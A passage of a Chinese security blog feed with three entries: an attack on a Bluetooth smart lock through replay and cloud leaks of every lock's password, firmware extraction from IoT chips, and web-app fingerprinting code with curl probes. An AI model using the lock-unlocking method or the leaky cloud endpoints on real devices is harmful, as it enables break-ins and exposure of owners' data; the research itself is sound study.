src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage16.jpg" alt="img"></p><h3 id="开锁流程"><a href="#开锁流程" class="headerlink" title="开锁流程"></a>开锁流程</h3><p>Logcat 查看app日志</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage17.jpg" alt="img"></p><p>流程为</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171123170725.jpg" alt="img"></p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>一般对于蓝牙锁的攻击方式有三种</p><p>1、重放攻击<br>2、暴力破解(6位数字)<br>3、云端漏洞</p><h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage18.jpg" alt="img"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage19.jpg" alt="img"></p><p>通过蓝牙抓包分析，发现通信过程没有加密，可以重放获取认证密码，但如果要模拟真实的智能锁攻击场景，显然不能通过如此显眼的方式，真实环境中往往很难有一个给我们抓包或劫持的场景，所以最好的方式是远程无接触开锁，需要去找云端的漏洞。</p><h3 id="云端漏洞"><a href="#云端漏洞" class="headerlink" title="云端漏洞"></a>云端漏洞</h3><p>云端是Thinkphp5 写的，稍微看了一下,存在有两个漏洞。无认证可以遍历所有id拿到所有锁的信息</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage20.jpg" alt="img"></p><p>没有关闭调试模式会泄露信息,传入一个空的id会吧所有锁的信息报错显示出来，泄露所有锁的密码以及绑定的电话号码mac地址等信息。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage21.jpg" alt="img"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>对于真实的破解锁场景，最好用一个手机app来开锁掩人耳目，综合以上分析，编写一个开锁Android app 。<br>工作流程为</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171123170725.jpg" alt="img"></p><p>利用 com.inuker.bluetooth 库快速开发</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage22.jpg" alt="img"></p><p>APP界面</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15117578788731.jpg" alt="img"></p><p>视频演示</p><p> <a href="https://v.qq.com/x/page/b051058vicv.html" target="_blank" rel="noopener">https://v.qq.com/x/page/b051058vicv.html</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>ti官方页面  <a href="http://www.ti.com.cn/product/cn/CC2541" target="_blank" rel="noopener">http://www.ti.com.cn/product/cn/CC2541</a><br>cc2541蓝牙芯片手册  <a href="https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="智能锁" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81/"/>
    
      <category term="蓝牙攻击" scheme="http://yaseng.org/tags/%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-固件提取</title>
    <link href="http://yaseng.org/iot-security-hardware-obtain.html"/>
    <id>http://yaseng.org/iot-security-hardware-obtain.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2018-06-29T10:54:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上节初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。<br>为了读取Flash芯片的内容，有以下两种常用方式：</p><p>1、直接将导线连接到芯片的引脚，在通过飞线连接编程器，进行在线读取固件；</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image34.jpg" alt=""></p><p>2、把芯片拆焊下来，通过烧录座编程器，离线读取固件。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/dce974d6b8fae7f6/20180606_154759.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d35d6e7f9a.jpg" alt=""></p><h2 id="飞线法读取"><a href="#飞线法读取" class="headerlink" title="飞线法读取"></a>飞线法读取</h2><p>通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image36.jpg" alt=""></p><h3 id="案例一：读取中控F7门禁固件"><a href="#案例一：读取中控F7门禁固件" class="headerlink" title="案例一：读取中控F7门禁固件"></a>案例一：读取中控F7门禁固件</h3><p>拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image37.jpg" alt=""></p><p>连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。<br>如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image38.jpg" alt=""></p><p>点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image39.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image40.jpg" alt=""></p><h3 id="案例二：读取某智能摄像头固件"><a href="#案例二：读取某智能摄像头固件" class="headerlink" title="案例二：读取某智能摄像头固件"></a>案例二：读取某智能摄像头固件</h3><p>拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image41.jpg" alt=""></p><p>在显微镜下，可以看到是一颗25L64型号的Flash芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image118.jpg" alt=""></p><p>用夹具连接各引脚，并和编程器连接，进行固件读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image42.jpg" alt=""></p><p>识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image43.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image44.jpg" alt=""></p><p>打开保存的BIN文件或者查看缓冲区，即可看到固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image45.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image46.jpg" alt=""></p><p>在Ubuntu中，用binwalk解包固件，做进一步分析。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image116.jpg" alt=""></p><h3 id="案例三：读取某智能摄像头固件"><a href="#案例三：读取某智能摄像头固件" class="headerlink" title="案例三：读取某智能摄像头固件"></a>案例三：读取某智能摄像头固件</h3><p>打开外壳，在PCB背面发现一颗FLASH存储芯片<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image47.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image48.jpg" alt=""></p><p>通过显微镜发现芯片型号为25L128。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image120.jpg" alt=""></p><p>连接编程器读取固件并保存。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image49.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image50.jpg" alt=""></p><h3 id="案例四：读取某路由器固件"><a href="#案例四：读取某路由器固件" class="headerlink" title="案例四：读取某路由器固件"></a>案例四：读取某路由器固件</h3><p>打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image52.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image119.jpg" alt=""></p><p>在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image51.jpg" alt=""></p><p>通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法）<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image54.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image53.jpg" alt=""></p><p>在编程器中选择该型号，成功提取出固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image55.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image56.jpg" alt=""></p><p>用binwalk解包固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image115.jpg" alt=""></p><h3 id="案例五：读取某智能电饭锅固件"><a href="#案例五：读取某智能电饭锅固件" class="headerlink" title="案例五：读取某智能电饭锅固件"></a>案例五：读取某智能电饭锅固件</h3><p>拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image57.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image58.jpg" alt=""></p><p>通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image59.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image60.jpg" alt=""></p><h3 id="案例六：读取某网络监控摄像机固件"><a href="#案例六：读取某网络监控摄像机固件" class="headerlink" title="案例六：读取某网络监控摄像机固件"></a>案例六：读取某网络监控摄像机固件</h3><p>在PCB上找到一块25L128型号的Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image62.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image121.jpg" alt=""></p><p>通过夹具连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image61.jpg" alt=""></p><p>识别到芯片为MX25L128，选择其中一种，成功提取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image63.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image64.jpg" alt=""></p><p>用binwalk解包固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image117.jpg" alt=""></p><h2 id="拆焊芯片读取固件"><a href="#拆焊芯片读取固件" class="headerlink" title="拆焊芯片读取固件"></a>拆焊芯片读取固件</h2><p>一般情况下，对于TSOP8封装的闪存芯片，可以用上述方法来读取，但可能存在在线读取成功率不高或数据丢失的情况，对于更多引脚和封装格式的芯片，飞线的难度更高，有一定锡焊基础的建议采用拆焊芯片，用烧录座离线读取的方法。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165648.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165631.jpg" alt=""></p><p>热风枪设置在适合的温度，吹下芯片，周围的元件可以用铝箔或锡箔纸适当保护。</p><p>拆下的闪存芯片放在烧录座上，在连接编程器进行读写，芯片放置的引脚方向要注意对齐编程器和烧录座的第一脚。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165637.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165659.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165651.jpg" alt=""></p><p>读取完成，用点焊法把芯片焊上焊盘即可。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165634.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628171222.jpg" alt=""></p><p>更多芯片焊接修改操作请参考2.4.2 硬件修改一节</p><h2 id="jtag提取固件"><a href="#jtag提取固件" class="headerlink" title="jtag提取固件"></a>jtag提取固件</h2><h3 id="拆焊芯片"><a href="#拆焊芯片" class="headerlink" title="拆焊芯片"></a>拆焊芯片</h3><p>首先用热风枪拆下智能锁主控芯片，该单片机型号为：Stm32F103R6。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3522b3bcebf.jpg" alt=""></p><h3 id="烧录座连接Jlink"><a href="#烧录座连接Jlink" class="headerlink" title="烧录座连接Jlink"></a>烧录座连接Jlink</h3><p>芯片第一脚对齐烧录座第一脚，然后把Jlink插入烧录座引出的JTAG接口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b352394427b3.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3523a551154.jpg" alt=""></p><h3 id="读取固件"><a href="#读取固件" class="headerlink" title="读取固件"></a>读取固件</h3><p>电脑上安装好Jlink驱动，打开J-Flash客户端，设置好参数，主要在配置栏选择正确的芯片型号，然后点击连接，在点击Target-&gt;Read Back-&gt;Entire trip即可读写固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524c6c08bb.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524ced11a4.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524d65ced7.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524db79b3c.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524f327ac3.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上节初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。&lt;br&gt;为了读取Flash芯片的内容，有
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件分析" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>浅谈现代化指纹识别及工具编写</title>
    <link href="http://yaseng.org/yet-another-web-fingerprinter.html"/>
    <id>http://yaseng.org/yet-another-web-fingerprinter.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2018-06-29T10:34:17.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用指纹识别是一个长久可研究的课题，本文主要探讨如何建立高效可靠的指纹识别方法。</p><h2 id="传统的指纹识别"><a href="#传统的指纹识别" class="headerlink" title="传统的指纹识别"></a>传统的指纹识别</h2><p>一些扫描器里面使用的比较多的都是通过特殊路径  静态文件的md5 值或者大小 关键词等，例如使用比较广泛的一个指纹数据库 。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15047737007020.jpg" alt="img"><br>存在几个问题</p><ol><li>效率太低，每一个路径都需要访问一次。容易被waf拦截</li><li>目前很多网站的静态资源 cdn于gzip 压缩，md5 其实是不一样的 ，识别率很低 </li></ol><h2 id="现代化指纹识别"><a href="#现代化指纹识别" class="headerlink" title="现代化指纹识别"></a>现代化指纹识别</h2><p>怎么来快速的精确的指纹识别，观察了大部分的web系统发现，访问首页并且获取response header  能识别出80% 的app<br>例如WordPress，discuz  会把独特的cookie放到header 里面。<br>discuz  的关键词  _saltkey=<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15109122240334.jpg" alt="img"></p><p>默认首页也会有很多固定的关键词，  WordPress   wp-conetnt<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15109123220322.jpg" alt="img"></p><p>剩下的指纹再去特殊url提取，这样效率和准确率会提高很多很多。</p><h2 id="现代化指纹识别方案"><a href="#现代化指纹识别方案" class="headerlink" title="现代化指纹识别方案"></a>现代化指纹识别方案</h2><h3 id="指纹库设计"><a href="#指纹库设计" class="headerlink" title="指纹库设计"></a>指纹库设计</h3><h4 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h4><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191426.jpg" alt="img"><br>指纹库类型目前有3种 ，当然后续还需要加上正则。<br>finger 规则是一个 string 之后的python 字典,里面有例如状态吗,规则等字段,例如  weblogic 的指纹规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;port&apos;:7001,&apos;url&apos;: &apos;/console/login/LoginForm.jsp&apos;, &apos;code&apos;: 200, &apos;grep&apos;: &apos;WebLogic Server&apos;&#125;</span><br></pre></td></tr></table></figure><p>下面介绍每一种指纹库实例</p><h4 id="指纹规则"><a href="#指纹规则" class="headerlink" title="指纹规则"></a>指纹规则</h4><h5 id="web-header-contain"><a href="#web-header-contain" class="headerlink" title="web_header_contain"></a>web_header_contain</h5><p>首页 response 里面的 header 查找特征符<br>速度最快,优先极最高。很多web cms 都会写特殊的cookie 键值。<br>例如 discuz,jboss,wordpress 等。<br>规则编写,以discuz 为例 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  tools  curl  -I    www.cctry.com</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Microsoft-IIS/6.0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Date: Thu, 07 Jan 2016 18:22:34 GMT</span><br><span class="line">Content-Type: text/html; charset=gbk</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Powered-By: PHP/5.2.17</span><br><span class="line">Set-Cookie: Vguy_2132_saltkey=O6srsEYk; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/; httponly</span><br><span class="line">Set-Cookie: Vguy_2132_lastvisit=1452187342; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/</span><br><span class="line">Set-Cookie: Vguy_2132_sid=MwE6e0; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</span><br><span class="line">Set-Cookie: Vguy_2132_lastact=1452190942%09index.php%09; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</span><br><span class="line">X-Daa-Tunnel: hop_count=1</span><br></pre></td></tr></table></figure><p>经过分析,字符串 _saltkey=  为discuz  header 中的规则<br>具体规则如下<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191240.jpg" alt="img"></p><h5 id="web-index-contain"><a href="#web-index-contain" class="headerlink" title="web_index_contain"></a>web_index_contain</h5><p>在缓存的首页里面查找关键词或者正则匹配<br>优先级次之,只需要 get请求一次即可。<br>例如Office Anywhere   指纹 编写流程<br>数据包分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  tools  curl  http://125.91.218.186:8000/   |  grep   <span class="string">'/images/tongda.ico'</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  2001  100  2001    0     0  11795      0 --:--:-- --:--:-- --:--:-- 11840</span><br><span class="line">&lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"/images/tongda.ico"</span>&gt;</span><br></pre></td></tr></table></figure><p>规则编写<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191233.jpg" alt="img"></p><h5 id="web-url-contain"><a href="#web-url-contain" class="headerlink" title="web_url_contain"></a>web_url_contain</h5><p>特殊url 查找指定的关键词(返回状态码也指定)。<br>优先级最低。<br>例如  weblogic 的指纹 finger 过程<br>数据包分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  tools  curl  -I     http://202.97.194.9:7001/console/login/LoginForm.jsp</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Date: Thu, 07 Jan 2016 18:53:28 GMT</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Expires: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="line">Set-Cookie: ADMINCONSOLESESSION=XQXrWT0LQTvpf8Jv75nMnQB9vN0cGppy7bTfJxfH9S673VTGP1Wl!1715621632; path=/</span><br><span class="line">Content-Language: zh-CN</span><br><span class="line">X-Powered-By: Servlet/2.5 JSP/2.1</span><br></pre></td></tr></table></figure><p>规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;url&apos;: &apos;/console/login/LoginForm.jsp&apos;, &apos;code&apos;: 200, &apos;grep&apos;: &apos;WebLogic Server&apos;&#125;</span><br></pre></td></tr></table></figure><p>表<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191224.jpg" alt="img"></p><h3 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h3><p>指纹识别模块代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> *@Projet  Yafinger</span><br><span class="line"> *@Author  yaseng@uauc.net</span><br><span class="line"> *@Desc    playweb finger modules</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import ast,time</span><br><span class="line">import config</span><br><span class="line">from   lib                import util</span><br><span class="line"></span><br><span class="line">def get_web_app(url):</span><br><span class="line">    rsp_index = util.http_get(url)</span><br><span class="line">    str_index = &quot;&quot;</span><br><span class="line">    if rsp_index == None :</span><br><span class="line">        return None</span><br><span class="line">    list_app=[]</span><br><span class="line">    fingers=config.get(&apos;fingers&apos;);</span><br><span class="line">    for  finger  in   fingers :</span><br><span class="line">        rule = ast.literal_eval(finger[&apos;finger&apos;])</span><br><span class="line">        if finger[&apos;type&apos;] == &apos;web_index_contain&apos;: </span><br><span class="line">            # limit header and  body and code  exp : &#123;&apos;header&apos;:&apos;jsessionid=&apos;,&apos;code&apos;: 200, &apos;grep&apos;: &apos;.action&apos;&#125;</span><br><span class="line">            if rule.has_key(&apos;header&apos;) and  rule[&apos;header&apos;] not in   str(rsp_index[&apos;headers&apos;]).lower()  : </span><br><span class="line">                continue</span><br><span class="line">            if rsp_index[&apos;code&apos;] == rule[&apos;code&apos;] and  rule[&apos;grep&apos;]  in rsp_index[&apos;data&apos;] :</span><br><span class="line">                list_app.append(&#123;&apos;app_id&apos;:finger[&apos;id&apos;], &apos;url&apos;:url&#125;)</span><br><span class="line">                util.log(&quot;url:%s app:%s&quot; % (url, finger[&apos;app_name&apos;]))</span><br><span class="line">    </span><br><span class="line">        elif finger[&apos;type&apos;] == &apos;web_url_contain&apos; :</span><br><span class="line">             rsp_tmp = util.http_get(url + rule[&apos;url&apos;])</span><br><span class="line">             if rsp_tmp == None :</span><br><span class="line">                 continue</span><br><span class="line">             if rsp_tmp[&apos;code&apos;] == rule[&apos;code&apos;] and  rule[&apos;grep&apos;]  in rsp_tmp[&apos;data&apos;] :</span><br><span class="line">                 list_app.append(&#123;&apos;app_id&apos;:finger[&apos;id&apos;], &apos;url&apos;:url&#125;)</span><br><span class="line">                 util.log(&quot;url:%s app:%s&quot; % (url + rule[&apos;url&apos;], finger[&apos;app_name&apos;]))</span><br><span class="line">        elif  finger[&apos;type&apos;] == &apos;web_header_contain&apos; :</span><br><span class="line"></span><br><span class="line">            if  rule[&apos;grep&apos;]  in  str(rsp_index[&apos;headers&apos;]).lower() :</span><br><span class="line">                list_app.append(&#123;&apos;app_id&apos;:finger[&apos;id&apos;], &apos;url&apos;:url&#125;)</span><br><span class="line">                util.log(&quot;url:%s app:%s&quot; % (url , finger[&apos;app_name&apos;]))</span><br><span class="line">                        </span><br><span class="line">            </span><br><span class="line">        time.sleep(0.01)</span><br><span class="line">    return  list_app</span><br></pre></td></tr></table></figure><h3 id="单独识别"><a href="#单独识别" class="headerlink" title="单独识别"></a>单独识别</h3><p>简单调用指纹识别模块代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"> *@Projet  Yafinger</span></span><br><span class="line"><span class="string"> *@Author  yaseng@uauc.net</span></span><br><span class="line"><span class="string"> *@Desc    yafinger test </span></span><br><span class="line"><span class="string">     __    __            ___                                         </span></span><br><span class="line"><span class="string">    /\ \  /\ \         /'___\  __                                    </span></span><br><span class="line"><span class="string">    \ `\`\\/'/   